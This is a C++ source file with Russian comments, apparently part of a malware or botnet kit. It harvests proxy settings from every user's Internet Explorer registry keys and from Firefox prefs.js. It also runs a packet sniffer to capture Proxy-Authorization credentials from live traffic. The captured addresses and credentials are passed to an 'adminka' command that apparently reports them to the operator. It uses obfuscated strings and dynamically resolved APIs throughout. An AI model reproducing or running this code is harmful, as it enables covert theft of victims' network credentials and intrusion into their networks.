#pragma once

#include "core\proxy.h"
#include "core\reestr.h"
#include "core\file.h"
#include "core\debug.h"
#include "core\sniffer.h"
#include "other.h"
#include "manager.h"

static int AppendAddr( Proxy::Info* addr, int count, int size, Proxy::Type type, const char* ipPort )
{
	if( count < size && addr ) 
	{
		if( addr[count].ipPort.Parse(ipPort) )
		{
			int i = 0;
			for( ; i < count; i++ )
				if( Str::Cmp( addr[i].ipPort.ip, addr[count].ipPort.ip ) == 0 && addr[i].ipPort.port == addr[count].ipPort.port )
					break;
			if( i < count ) //такой уже есть
			{
				if( addr[i].type < type )
					addr[i].type = type;
			}
			else
			{
				addr[count].type = type;
				count++;
			}
		}
	}
	return count;
}

static int GetProxyIE( Proxy::Info* addr, int count, int size )
{
	Reestr r(HKEY_USERS);
	int i = 0;
	StringBuilderStack<128> subKey;
	StringBuilder nameKey;
	StringBuilder value;
	for(;;)
	{
		if( !r.Enum( subKey, i ) ) break;
		Path::Combine( nameKey, subKey, _CS_("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" ) );
		Reestr r2( r.GetKey(), nameKey, KEY_READ );
		if( r2.Valid() ) 
		{
			if( r2.GetString( _CS_("ProxyServer"), value ) )
			{
				if( value.IndexOf('=') ) //идет перечень протоколов
				{
					StringArray sa = value.Split(';');
					for( int i = 0; i < sa.Count(); i++ )
					{
						StringBuilder& s = sa[i];
						int p = s.IndexOf('=');
						if( p > 0 )
						{
							Proxy::Type type = (Proxy::Type)-1;
							if( p == 4 && s.Cmp( _CS_("http"), 4 ) == 0 )
								type = Proxy::HTTP;
							else if( p == 5 && s.Cmp( _CS_("https"), 5 ) == 0 )
								type = Proxy::HTTPS;
							else if( p == 5 && s.Cmp( _CS_("socks"), 5 ) == 0 )
								type = Proxy::SOCKS5;
							if( type != (Proxy::Type)-1 )
								count = AppendAddr( addr, count, size, type, s.c_str() + p + 1 );
						}
					}
				}
				else  //указан только айпи и порт
					count = AppendAddr( addr, count, size, Proxy::HTTP, value );
			}
		}
		i++;
	}
	return count;
}

//извлекает число или значение между "
static int GetValueFirefox( const StringBuilder& s, int p, char* to, int c_to )
{
	while( (s[p] < '0' || s[p] > '9') && s[p] ) p++; //ищем число
	if( s[p] == 0 ) return -1;
	int i = 0;
	while( i < c_to - 1 && s[p] != '"' && s[p] != ')' ) //копируем пока не встретим " или )
	{
		*to++ = s[p];
		i++; p++;
	}
	*to = 0;
	return p;
}

static int AppendIpPortFirefox( const StringBuilder& s, int& i, const char* fld, Proxy::Type type,  Proxy::Info* addr, int count, int size )
{
	//ищем айпи
	int c_fld = Str::Len(fld);
	int p = s.IndexOf( i, fld, c_fld );
	if( p < 0 ) return count;
	char ipPort[32];
	p += c_fld;
	int p1 = GetValueFirefox( s, p, ipPort, sizeof(ipPort) );
	if( p1 < 0 ) return count;
	int len = Str::Len(ipPort);
	ipPort[len++] = ':';
	//ищем порт
	p = s.IndexOf( p1, fld );
	if( p < 0 ) return count;
	p1 = GetValueFirefox( s, p1 + c_fld, ipPort + len, sizeof(ipPort) - len );
	if( p1 < 0 ) return count;
	i = p1;
	return AppendAddr( addr, count, size, type, ipPort );
}

static int GetProxyFirefox( Proxy::Info* addr, int count, int size )
{
	Reestr r(HKEY_USERS);
	int i = 0;
	StringBuilderStack<64> subKey;
	StringBuilder nameKey, appPath, pathIni, pathFirefox, pathPrefs;
	Mem::Data data;
	for(;;)
	{
		if( !r.Enum( subKey, i ) ) break;
		Path::Combine( nameKey, subKey, _CS_("Volatile Environment" ) );
		Reestr r2( r.GetKey(), nameKey, KEY_READ );
		if( r2.Valid() ) 
		{
			if( r2.GetString( _CS_("APPDATA"), appPath ) )
			{
				Path::Combine( pathFirefox, appPath, _CS_("Mozilla\\Firefox") );
				Path::Combine( pathIni, pathFirefox, _CS_("profiles.ini") );
				if( File::IsExists(pathIni) )
				{
					for( int n = 0; n < 10; n++ )
					{
						StringBuilderStack<32> profile( _CS_("Profile") );
						profile += n;		
						StringBuilderStack<64> pathProfile;
						int len = API(KERNEL32, GetPrivateProfileStringA)( profile, _CS_("Path"), 0, pathProfile.c_str(), pathProfile.Size(), pathIni );
						if( len > 0 )
						{
							pathProfile.SetLen(len);
							Path::Combine( pathPrefs, pathFirefox, pathProfile, _CS_("prefs.js") );
							if( File::ReadAll( pathPrefs, data ) )
							{
								StringBuilder s(data);
								int i = 0;
								count = AppendIpPortFirefox( s, i, _CS_("network.proxy.http"), Proxy::HTTP, addr, count, size );
								count = AppendIpPortFirefox( s, i, _CS_("network.proxy.socks"), Proxy::SOCKS5, addr, count, size );
							}
						}
					}
				}
			}
		}
		i++;
	}
	return count;
}

int FindProxyAddr( Proxy::Info* addr, int size )
{
	Mem::Set( addr, 0, sizeof(Proxy::Info) * size );
	int count = 0;
	count = GetProxyIE( addr, count, size );
	count = GetProxyFirefox( addr, count, size );
	return count;
}

/////////////////////////////////////////////////////////////////////
/*
struct ProxyAuthenticationIP
{
	ULONG ip;
	USHORT port; //номер порта где байты в сетевом порядке
	int counter; //сколько раз должен встретится поле аунтентификации, после чего можно его сохранить
	Proxy::Info addr;
};

struct ProxyAuthenticationData
{
	ProxyAuthenticationIP ips[10];
	int c_ips; //количество ищущихся айпи
	int remain; //сколько осталось найти (в начале должно быть равно c_ips)
	char ProxyAuthorization[24];
	int c_ProxyAuthorization;
};

static bool FindAuthenticationProxyCallback( const IPHeader* header, const void* data, int c_data, void* tag )
{
	//в начале данных пакета идут номера портов, сначала откуда, 2-й - куда (нам нужен 2-й)
	if( data == 0 || c_data <= 0 ) return false;
	USHORT* ports = (USHORT*)data;
	ProxyAuthenticationData* pad = (ProxyAuthenticationData*)tag;
	for( int i = 0; i < pad->c_ips; i++ )
	{
		if( header->iph_dest == pad->ips[i].ip && ports[1] == pad->ips[i].port )
		{
			int p = Mem::IndexOf( data, c_data, pad->ProxyAuthorization, pad->c_ProxyAuthorization );
			if( p > 0 )
			{
				p += pad->c_ProxyAuthorization;
				char* s = (char*)data;
				while( s[p] == ' ' || s[p] == ':' ) p++; //идем до начала значения
				int p2 = Mem::IndexOf( s + p, '\r', c_data - p ); 
				if( p2 > 0 )
				{
					Str::Copy( pad->ips[i].addr.authentication, sizeof(pad->ips[i].addr.authentication), s + p, p2 );
				}
			}
			//берем не первую попавшуюся строку авторизации прокси, так как она может быть ошибочной из-за того, что юзер может неверно ввести пароль
			if( pad->ips[i].counter-- <= 0 ) 
			{
				SendCmdAdminka( &pad->ips[i].addr, 1 );
				DbgMsg( "Найдена строка аутентификации для прокси %d, %s:%d '%s'", pad->ips[i].addr.type, pad->ips[i].addr.ipPort.ip, pad->ips[i].addr.ipPort.port, pad->ips[i].addr.authentication );
				//исключаем из поиска, не зависимо от того есть нужная строка или нет
				pad->ips[i].ip = 0; 
				pad->remain--;
			}
		}
	}
	if( pad->remain <= 0 )
		return true;
	return false;
}

static DWORD WINAPI FindAuthenticationProxyThread( void* data )
{
	ULONG dst[10];
	ProxyAuthenticationData* pad = (ProxyAuthenticationData*)data;
	for( int i = 0; i < pad->c_ips; i++ )
		dst[i] = pad->ips[i].ip;
	Sniffer::Filter( 0, 0, dst, pad->c_ips, IPPROTO_TCP, FindAuthenticationProxyCallback, 2000, data );
	delete data;
	//прокси для которых не нашли аутентификацию выполняем команду для его сохранения в конфиг файле
	for( int i = 0; i < pad->c_ips; i++ )
		if( pad->ips[i].ip )
			SendCmdAdminka( &pad->ips[i].addr, 1 );
	DbgMsg( "Поиск строк аутенфикации прокси завершена" );
	return 0;
}

void FindAuthenticationProxy( Proxy::Info* addr, int c_addr )
{
	if( addr == 0 || c_addr <= 0 ) return;
	ProxyAuthenticationData* data = new ProxyAuthenticationData;
	Mem::Set( data, 0, sizeof(ProxyAuthenticationData) );
	if( c_addr >= 10 )c_addr = 10;
	for( int i = 0; i < c_addr; i++ )
	{
		Mem::Copy( &data->ips[i].addr, &addr[i], sizeof(Proxy::Info) );
		data->ips[i].ip = API(WS2_32, inet_addr)( addr[i].ipPort.ip );
		data->ips[i].port = API(WS2_32, htons)( addr[i].ipPort.port );
		data->ips[i].counter = 16;
	}
	data->c_ips = c_addr;
	data->remain = c_addr;
	Str::Copy( data->ProxyAuthorization, _CS_("Proxy-Authorization") );
	data->c_ProxyAuthorization = Str::Len(data->ProxyAuthorization);
	RunThread( FindAuthenticationProxyThread, data );
}
*/

void SendCmdAdminka( Proxy::Info* addr, int c_addr )
{
	StringBuilder cmd;
	for( int i = 0; i < c_addr; i++ )
	{
		cmd = _CS_("adminka ");
		switch( addr[i].type )
		{
			case Proxy::HTTP: cmd += _CS_("http"); break;
			case Proxy::HTTPS: cmd += _CS_("https"); break;
			case Proxy::SOCKS5: cmd += _CS_("socks5"); break;
		}
		cmd += ' ';
		cmd += addr[i].ipPort.ip;
		cmd += ':';
		cmd += addr[i].ipPort.port;
		if( addr[i].authentication[0] )
		{
			cmd += ' ';
			cmd += addr[i].authentication;
		}
		ManagerServer::CmdExec( cmd, cmd.Len() );
	}
}

struct FoundProxy
{
	ULONG ip;
	USHORT port; //номер порта где байты в сетевом порядке
	Proxy::Type type;
	char authentication[128];
	int counter; //количество запросов на данный адрес 
};

const int MaxFoundProxy = 10;

struct ProxyData
{
	FoundProxy fp[MaxFoundProxy];
	int c_fp;
	char ProxyAuthorization[24];
	int c_ProxyAuthorization;
	int counter; //количество обработанных GET запросов
};

static bool FindProxyCallback( const IPHeader* header, const void* data, int c_data, void* tag )
{
	if( data == 0 || c_data < 0 ) return false;
	int offset = (((byte*)data)[12] >> 4) * 4; //смещение данных (длина заголовка TCP-пакета в 32-битовых словах)
	const char* s = (const char*)data + offset; //начала HTTP запроса (или ответа)
	int c_s = c_data - offset;
	ProxyData* pd = (ProxyData*)tag;
	if( s[0] == 'G' && s[1] == 'E' && s[2] == 'T' ) //смотрим только в GET запросах
	{
		int p = Mem::IndexOf( s, c_s, pd->ProxyAuthorization, pd->c_ProxyAuthorization );
		if( p > 0 )
		{
			USHORT* ports = (USHORT*)data;
			int i = 0;
			for( ; i < pd->c_fp; i++ )
				if( pd->fp[i].ip == header->iph_dest && pd->fp[i].port == ports[1] )
					break;
			if( i >= pd->c_fp )
			{
				if( i < MaxFoundProxy )
				{
					pd->fp[i].ip = header->iph_dest;
					pd->fp[i].port = ports[1];
					pd->fp[i].type = Proxy::HTTP;
					pd->fp[i].counter = 0;
					pd->c_fp++;
				}
				else
					i = -1;
			}
			if( i >= 0 )
			{
				p += pd->c_ProxyAuthorization;
				while( s[p] == ' ' || s[p] == ':' ) p++; //идем до начала значения
				int p2 = Mem::IndexOf( s + p, '\r', c_s - p ); 
				if( p2 > 0 )
				{
					Str::Copy( pd->fp[i].authentication, sizeof(pd->fp[i].authentication), s + p, p2 );
					pd->fp[i].counter++;
					if( pd->fp[i].counter > 10 ) //встретился данный айпи нужное количество раз, считаем его прокси и заканчиваем поиск
					{
						return true;
					}
				}
			}
		}

	}
	pd->counter++;
	if( pd->counter > 500 ) //после обработки 100 GET запросов заканчиваем поиск, т. е. прокси не найден
		return true;
	return false;
}

DWORD WINAPI FindProxyAddrCrossSniffer( void* )
{
	ProxyData pd;
	pd.c_fp = 0;
	Str::Copy( pd.ProxyAuthorization, _CS_("Proxy-Authorization") );
	pd.c_ProxyAuthorization = Str::Len(pd.ProxyAuthorization);
	Sniffer::Filter( 0, 0, 0, 0, IPPROTO_TCP, FindProxyCallback, 2000, &pd );
	Proxy::Info addr;
	for( int i = 0; i < pd.c_fp; i++ )
	{
		if( pd.fp[i].counter > 10 )
		{
			addr.type = pd.fp[i].type;
			in_addr addr2;
			addr2.S_un.S_addr = pd.fp[i].ip;
			Str::Copy( addr.ipPort.ip, API(WS2_32, inet_ntoa)(addr2) );
			addr.ipPort.port = API(WS2_32, htons)(pd.fp[i].port);
			Str::Copy( addr.authentication, sizeof(addr.authentication), pd.fp[i].authentication );
			SendCmdAdminka( &addr, 1 );
			break;
		}
	}
	DbgMsg( "Поиск прокси завершена" );
	return 0;
}
